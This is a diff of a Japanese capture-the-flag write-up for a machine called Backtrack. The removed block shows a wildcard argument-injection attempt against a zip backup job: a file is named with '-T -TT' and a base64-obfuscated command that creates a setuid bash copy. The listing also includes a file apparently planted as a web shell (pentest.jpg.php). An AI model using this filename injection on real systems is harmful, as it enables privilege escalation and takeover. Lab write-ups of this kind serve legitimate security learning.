@@ -416,25 +416,6 @@ WantedBy=multi-user.target
 zip -q -r /home/orville/web_snapshot.zip /var/www/html/*
 ```
 
-```sh
-orville@Backtrack:/home/orville$ touch "/var/www/html/-T -TT 'exit; echo Y3AgL3Vzci9iaW4vYmFzaCAvaG9tZS9vcnZpbGxlL2Jhc2g7Y2htb2QgK3N4IC9ob21lL29ydmlsbGUvYmFzaDsK|base64 -d|bash'"
-orville@Backtrack:/home/orville$ ls -al /var/www/html
-total 48
--rw-rw-rw- 1 orville orville     0 Dec  8 03:40 '-T -TT '\''exit; echo Y3AgL3Vzci9iaW4vYmFzaCAvaG9tZS9vcnZpbGxlL2Jhc2g7Y2htb2QgK3N4IC9ob21lL29ydmlsbGUvYmFzaDsK|base64 -d|bash'\'''
-drwxrwx--- 5 orville www-data 4096 Dec  8 03:40  .
-drwxr-xr-x 3 root    root     4096 Mar  9  2024  ..
-drwxrwx--- 2 orville www-data 4096 Mar 13  2024  css
--rw-rw-r-- 1 orville orville  2770 Oct  2  2023  dashboard.php
-drwxrwx--- 2 orville www-data 4096 Mar 13  2024  includes
--rw-rw-r-- 1 orville orville   822 Oct  2  2023  index.php
--rw-rw-r-- 1 orville orville  1693 Oct  2  2023  login.php
--rw-rw-r-- 1 orville orville   220 Jun 24  2023  logout.php
--rw-rw-r-- 1 orville orville  1281 Oct  2  2023  navbar.php
--rw-r--r-- 1 orville orville  2594 Dec  8 03:39  pentest.jpg.php
--rw-rw-r-- 1 orville orville   334 Sep 28  2023  register.php
-drwxrwx--- 2 orville www-data 4096 Aug 26  2023  uploads
-```
-
 ワイルドカードを利用して -T -TT でコマンド実行する方法を試したが、コマンド実行されなかった。
 
 ```sh
